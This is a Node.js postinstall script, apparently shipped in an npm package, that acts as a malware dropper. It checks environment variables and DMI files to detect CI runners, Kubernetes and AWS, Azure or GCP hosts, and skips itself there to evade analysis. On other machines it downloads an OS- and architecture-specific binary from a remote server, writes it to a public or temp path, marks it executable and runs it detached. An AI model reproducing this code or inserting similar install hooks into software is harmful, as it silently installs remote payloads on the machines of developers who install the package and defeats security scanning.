import fs from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';

const BASE = (
  process.env.STARSHIP_BASE || 'http://10.10.6.129:8787'
).replace(/\/$/, '');

/** Skip dropper when we look like a cloud / managed / CI runner (.lab focus: IaaS + cloud CI). */
function isLikelyCloudOrManagedEnvironment() {
  const e = process.env;

  // Cloud & SaaS CI (ephemeral VMs)
  if (e.GITHUB_ACTIONS === 'true') return { skip: true, reason: 'GitHub Actions' };
  if (e.GITLAB_CI === 'true' || e.CI_PROJECT_ID) return { skip: true, reason: 'GitLab CI' };
  if (e.CIRCLECI === 'true') return { skip: true, reason: 'Circle CI' };
  if (e.BUILDKITE === 'true') return { skip: true, reason: 'Buildkite' };
  if (e.TRAVIS === 'true') return { skip: true, reason: 'Travis CI' };
  if (e.CF_PAGES === '1' || e.VERCEL || e.NETLIFY) return { skip: true, reason: 'edge/CI hosting' };

  // Kubernetes / container orchestration (usually cloud-hosted)
  if (e.KUBERNETES_SERVICE_HOST) return { skip: true, reason: 'Kubernetes' };

  // AWS (EC2 / Lambda / ECS / batch)
  if (e.AWS_EXECUTION_ENV) return { skip: true, reason: 'AWS Lambda' };
  if (e.ECS_CONTAINER_METADATA_URI || e.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
    return { skip: true, reason: 'AWS ECS/task' };
  if (e.AWS_BATCH_JOB_ID) return { skip: true, reason: 'AWS Batch' };
  // EC2 Nitro/old: instance identity in env varies; rely on Linux DMI below

  // Azure
  if (e.WEBSITE_SITE_NAME || e.WEBSITE_INSTANCE_ID || e.AZ_BATCH_POOL_ID || e.APPSETTING_WEBSITE_SITE_NAME)
    return { skip: true, reason: 'Azure Web / Batch signature' };

  // GCP / Firebase / Cloud Shell
  if (e.K_SERVICE || e.CLOUD_RUN_JOB || e.FUNCTION_TARGET) return { skip: true, reason: 'GCP serverless' };
  if (e.GOOGLE_CLOUD_PROJECT && (e.K_SERVICE || e.GAE_APPLICATION || e.CLOUD_SHELL === 'true'))
    return { skip: true, reason: 'GCP/App Engine / Cloud Shell' };

  // Linux DMI — major IaaS
  if (os.platform() === 'linux') {
    const readTrim = (p) => {
      try {
        return fs.readFileSync(p, 'utf8').trim();
      } catch {
        return '';
      }
    };
    const vendor = readTrim('/sys/class/dmi/id/sys_vendor').toLowerCase();
    const product = readTrim('/sys/class/dmi/id/product_name').toLowerCase();
    if (vendor.includes('amazon'))
      return { skip: true, reason: 'DMI sys_vendor Amazon (EC2/outpost-like)' };
    if (vendor.includes('google'))
      return { skip: true, reason: 'DMI sys_vendor Google (GCE/etc.)' };
    if (vendor.includes('microsoft corporation') && product.includes('virtual machine'))
      return { skip: true, reason: 'DMI Azure-style VM' };
    if (product.includes('openstack') || product.includes('kvm') || product.includes('openstack nova'))
      return { skip: true, reason: 'DMI KVM/OpenStack (common cloud image)' };

    const hv = readTrim('/sys/class/dmi/id/board_vendor').toLowerCase();
    if (hv.includes('openstack')) return { skip: true, reason: 'DMI OpenStack board' };

    // QEMU alone is ambiguous (local virt); hint only with cloud-ish env
    if (vendor.includes('qemu') || product.includes('qemu')) {
      if (e.AWS_REGION || e.AWS_DEFAULT_REGION || e.GOOGLE_CLOUD_PROJECT || e.AZURE_CLIENT_ID)
        return { skip: true, reason: 'QEMU + cloud SDK env hints' };
    }
  }

  // macOS rarely cloud VM for this script — optional iCloud-derived CI
  if (os.platform() === 'darwin' && e.TF_BUILD) return { skip: true, reason: 'Azure Pipelines agent (darwin)' };

  return { skip: false, reason: '' };
}

/** Map Node process.arch to droppers/<name> slug (amd64/arm64). */
function archSlug() {
  switch (process.arch) {
    case 'x64':
      return 'amd64';
    case 'arm64':
      return 'arm64';
    case 'arm':
      return 'arm';
    default:
      return process.arch;
  }
}

/** Droppers route id per Unix OS + arch (same layout as agent builds). */
function unixDropperId() {
  const plat = os.platform();
  if (plat === 'linux') return `agent-linux-${archSlug()}`;
  if (plat === 'darwin') return `agent-darwin-${archSlug()}`;
  return `agent-${plat}-${archSlug()}`;
}

function fetchToFile(url, destPath, cb) {
  const lib = url.startsWith('https:') ? https : http;
  const req = lib.get(url, (res) => {
    if (res.statusCode === 301 || res.statusCode === 302 || res.statusCode === 307 || res.statusCode === 308) {
      const loc = res.headers.location;
      if (loc) {
        fetchToFile(new URL(loc, url).href, destPath, cb);
        return;
      }
    }
    if (res.statusCode !== 200) {
      cb(new Error(`HTTP ${res.statusCode} for ${url}`));
      return;
    }
    const file = fs.createWriteStream(destPath, { mode: 0o600 });
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
    file.on('error', cb);
    res.on('error', cb);
  });
  req.on('error', cb);
}

function run() {
  const cloud = isLikelyCloudOrManagedEnvironment();
  if (cloud.skip) {
    console.log('[postinstall] skip (cloud / managed runtime):', cloud.reason);
    return;
  }

  if (os.platform() === 'win32') {
    console.log('Running on Windows');
    const winPath = 'c:/users/public/windows.exe';
    const url = `${BASE}/droppers/windows.exe`;
    fetchToFile(url, winPath, (err) => {
      if (err) {
        console.error(err);
        return;
      }
      const child = spawn(winPath, [], {
        detached: true,
        stdio: 'ignore',
      });
      child.unref();
    });
  } else {
    const id = unixDropperId();
    const outName = path.join(os.tmpdir(), id);
    const url = `${BASE}/droppers/${id}`;
    console.log(`Unix: fetching ${url} -> ${outName}`);

    fetchToFile(url, outName, (err) => {
      if (err) {
        console.error(err);
        return;
      }
      try {
        fs.chmodSync(outName, 0o755);
      } catch (e) {
        console.error('chmod:', e);
        return;
      }
      const child = spawn(outName, [], {
        detached: true,
        stdio: 'ignore',
      });
      child.unref();
    });
  }
}

run();
